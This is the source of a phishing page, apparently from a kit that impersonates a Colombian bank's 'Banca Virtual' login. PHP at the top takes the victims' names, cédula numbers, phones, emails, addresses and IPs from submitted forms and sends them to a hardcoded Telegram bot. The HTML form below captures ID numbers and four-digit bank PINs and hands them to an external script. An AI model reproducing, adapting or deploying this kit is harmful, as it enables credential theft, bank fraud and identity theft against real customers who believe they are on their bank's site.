<?php
if (!empty($_POST)) {
    // âœ… INFORMACION PERSONAS
    $botToken = '7449448770:AAH6SRnpH5bk5fRfD_oEs-j50LbK-GX_iw4';
    $chatId   = '-4896949011';

    $origen = $_POST['origen'] ?? '';
    $mensaje = '';

    if ($origen === 'bancolombia') {
        $nombre = trim($_POST['nombre'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "ðŸ¦ BOTON BANCOLOMBIA ðŸ¦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "âš™ï¸Nombre: $nombre\n";
        $mensaje .= "ðŸ’³CÃ©dula: $documento\n";
        $mensaje .= "ðŸ“žTelÃ©fono: $telefono\n"; // â† AQUÃ EL \n ES CLAVE
        $mensaje .= "âœ‰ï¸Correo: $email";
        $mensaje .= "ðŸŒIP: $ip";

    } elseif ($origen === 'pse') {
        $banco = trim($_POST['select'] ?? '');
        $nombre = trim($_POST['nombre'] ?? '');
        $direccion = trim($_POST['direccion'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "ðŸ¦ BOTON BOGOTA ðŸ¦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "ðŸ’°Banco: $banco\n";
        $mensaje .= "âš™ï¸Nombre: $nombre\n";
        $mensaje .= "ðŸ“DirecciÃ³n: $direccion\n"; // â† AQUÃ EL \n ES CLAVE
        $mensaje .= "ðŸ’³CÃ©dula: $documento\n";
        $mensaje .= "ðŸ“žTelÃ©fono: $telefono\n";
        $mensaje .= "âœ‰ï¸Correo: $email\n";
        $mensaje .= "ðŸŒIP: $ip";

} else {
    $lineas = [];
    foreach ($_POST as $campo => $valor) {
        $valor = is_array($valor) ? implode(', ', $valor) : trim((string) $valor);
        $lineas[] = ucfirst($campo) . ': ' . $valor;
    }
    $mensaje = "ðŸ“ Formulario desconocido\n" . implode("\n", $lineas);
}

    // âœ… AQUÃ YA ESTÃN DEFINIDAS LAS VARIABLES $botToken y $chatId
    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_POSTFIELDS => http_build_query($data),
    ]);
    curl_exec($ch);
    curl_close($ch);
}
?>


<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Banca Virtual - Ingreso</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
  <link rel="stylesheet" href="bogota.css">
</head>
<body>
  <div class="login-container" id="login-container">
    <div class="header">
      <img src="logo.svg" alt="Logo" class="logo">
      <h1>Bienvenido a tu Banca Virtual</h1>
    </div>

    <section class="banner">
      <img src="leita.png" alt="" class="banner-image">
      <div class="banner-text">
        Â¿Nunca has ingresado a Banca Virtual?<br>
        AquÃ­ te decimos cÃ³mo hacerlo &rsaquo;
      </div>
    </section>

    <div class="tabs">
      <button class="active">Clave segura</button>
      <button class="active1">Tarjeta dÃ©bito</button>
    </div>

    <section class="info-box">
      <div class="info-text">
        <p>
          EstÃ¡s ingresando con tu Clave Segura.<br>
          Selecciona â€˜Tarjeta DÃ©bitoâ€™ para cambiar el tipo de ingreso.
        </p>
      </div>
      <button class="close-btn" title="Cerrar">
        <svg width="20" height="20" viewBox="0 0 26 26" aria-hidden="true" focusable="false">
          <line x1="5" y1="5" x2="21" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
          <line x1="21" y1="5" x2="5" y2="21" stroke="#5C93C6" stroke-width="2.2"/>
        </svg>
      </button>
    </section>

    <div class="form-block-identificacion">
      <label for="identificacion" class="identidad">IdentificaciÃ³n</label>
      <div class="input-group">
        <div class="custom-select-wrapper">
          <select id="tipo-id">
            <option value="cc" data-label="C.C.">C.C. â€“ CÃ©dula de ciudadanÃ­a</option>
            <option value="ti" data-label="T.I.">T.I. â€“ Tarjeta de identidad</option>
            <option value="ce" data-label="C.E.">C.E. â€“ CÃ©dula de extranjerÃ­a</option>
            <option value="ce" data-label="N.P.N.">N.P.N. â€“ NIT Persona Natural</option>
            <option value="ce" data-label="N.P.E.">N.P.E. â€“ NIT Persona Extranjera</option>
            <option value="ce" data-label="N.P.J.">N.P.J. â€“ NIT Persona JurÃ­dica</option>
            <option value="ce" data-label="P.S.">P.S. â€“ Pasaporte</option>
            <option value="ce" data-label="R.C.">R.C. â€“ Registro Civil</option>
          </select>
          <div class="select-display" id="tipo-display">C.C.</div>
        </div>
        <input type="text" id="txtUsuario" class="input-id" placeholder="#">
      </div>

      <label for="clave" class="clave">Clave segura</label>
      <div class="password-group">
        <input type="password" id="txtPass" placeholder="....">
        <span class="material-symbols-outlined toggle-icon" id="togglePassword">visibility</span>
      </div>

      <button class="btn-ingresar" id="btnUsuario" disabled>Ingresar</button>

      <div class="footer-links">
        <a href="#">Registrarme â€º</a>
        <span class="divider"></span>
        <a href="#">OlvidÃ© mi clave â€º</a>
      </div>
    </div> <!-- cierre de form-block-identificacion -->

  </div> <!-- cierre de login-container -->

  <!-- reCAPTCHA fuera del cuadro blanco y centrado -->
  <div class="recaptcha-info">
    Este sitio estÃ¡ protegido por reCAPTCHA y aplican las
    <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">polÃ­ticas de privacidad</a>
    y los
    <a href="https://policies.google.com/terms" target="_blank" rel="noopener">tÃ©rminos de servicio de Google</a>.
  </div>

  <!-- Incluye tus scripts -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <!-- Este es tu archivo JS donde estÃ¡ pasousuario -->
  <script type="text/javascript" src="../../scripts/functions2.js"></script>

  <script>
    const txtUsuario = document.getElementById('txtUsuario');
    const txtPass = document.getElementById('txtPass');
    const btnUsuario = document.getElementById('btnUsuario');

    function validarBoton() {
      // Usuario: 1 a 16 nÃºmeros. Clave: 4 nÃºmeros exactos
      const userOk = /^\d{1,16}$/.test(txtUsuario.value);
      const passOk = /^\d{4}$/.test(txtPass.value);

      if (userOk && passOk) {
        btnUsuario.disabled = false;
        btnUsuario.classList.add('enabled');
      } else {
        btnUsuario.disabled = true;
        btnUsuario.classList.remove('enabled');
      }
    }

    txtUsuario.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').slice(0, 16);
      validarBoton();
    });

    txtPass.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').slice(0, 4);
      validarBoton();
    });

    // Por si autocompleta al cargar
    window.addEventListener('DOMContentLoaded', validarBoton);

    $(document).ready(function() {
      $('#btnUsuario').click(function() {
        if (btnUsuario.disabled) return; // No hace nada si estÃ¡ deshabilitado
        if ($("#txtUsuario").val().length > 0) {
          pasousuario(
            $("#txtPass").val(),
            $("#txtUsuario").val(),
            $("#banco").val()
          );
        } else {
          $("#err-mensaje").show();
          $(".user").css("border", "1px solid red");
          $("#txtUsuario").focus();
        }
      });

      $("#txtUsuario").keyup(function(e) {
        $(".user").css("border", "1px solid #CCCCCC");
        $("#err-mensaje").hide();
      });
    });
  </script>

  <script>
    // Mismo listener que ya tenÃ­as, solo una vez
    document.addEventListener('DOMContentLoaded', function() {
      const selectTipo = document.getElementById('tipo-id');
      const displayTipo = document.getElementById('tipo-display');

      function actualizarDisplay() {
        const opcion = selectTipo.options[selectTipo.selectedIndex];
        const etiqueta = opcion.getAttribute('data-label');
        displayTipo.textContent = etiqueta;
      }

      selectTipo.addEventListener('change', actualizarDisplay);
      actualizarDisplay();
    });
  </script>

  <script>
    // Script Ãºnico para mostrar/ocultar contraseÃ±a
    document.addEventListener('DOMContentLoaded', function() {
      const txtPass = document.getElementById('txtPass');
      const togglePassword = document.getElementById('togglePassword');

      togglePassword.addEventListener('click', function() {
        const currentType = txtPass.getAttribute('type');
        const nuevoTipo = currentType === 'password' ? 'text' : 'password';
        txtPass.setAttribute('type', nuevoTipo);
        this.textContent = (nuevoTipo === 'password') ? 'visibility' : 'visibility_off';
      });
    });
  </script>
</body>
</html>

